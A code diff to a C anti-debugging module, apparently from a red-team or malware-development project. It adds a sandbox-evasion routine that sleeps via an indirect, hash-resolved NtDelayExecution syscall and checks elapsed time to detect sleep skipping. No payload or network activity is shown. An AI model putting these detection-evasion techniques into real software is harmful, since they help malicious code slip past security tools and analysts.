@@ -1,6 +1,9 @@
 #include "anti-debug.h"
+#include "indirect_syscall.h"
+#include "debug.h"
 
 // https://github.com/LordNoteworthy/al-khaser
+#define DEBUG
 
 BOOL AntiDebugPEBCheck() {
 	// Obtain the PEB offset
@@ -70,4 +73,46 @@ Return Value:
 		return TRUE;
 	else
 		return FALSE;
+}
+
+
+
+BOOL DelayExecution(FLOAT ftMinutes) {
+
+	NTAPI_FUNC _G_NTFUNC = { 0 };
+
+	// Converting minutes to milliseconds  
+	DWORD               dwMilliSeconds = ftMinutes * 60000;
+	LARGE_INTEGER       DelayInterval = { 0 };
+	LONGLONG            Delay = NULL;
+	NTSTATUS            STATUS = NULL;
+	DWORD               _T0 = NULL,
+						_T1 = NULL;
+
+	// Converting from milliseconds to the 100-nanosecond - negative time interval
+	Delay = dwMilliSeconds * 10000;
+	DelayInterval.QuadPart = -Delay;
+
+	_T0 = GetTickCount64();
+
+	// Sleeping for 'dwMilliSeconds' ms 
+	ObtainSyscall(NTDELAYEXECUTION_HASH, &_G_NTFUNC.NtDelayExecution);
+	SET_SYSCALL(_G_NTFUNC.NtDelayExecution);
+#ifdef DEBUG
+	PRINTA("[+] Starting execution delay!\n");
+#endif
+	if ((STATUS = RunSyscall(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
+#ifdef DEBUG
+			PRINTA("[!] NtDelayExecution Failed With Error: 0x%0.8X \n", STATUS);
+#endif
+			return -1;
+	}
+
+	_T1 = GetTickCount64();
+
+	// Slept for at least 'dwMilliSeconds' ms, then 'DelayExecution' succeeded, otherwise it failed
+	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
+		return FALSE;
+
+	return TRUE;
 }
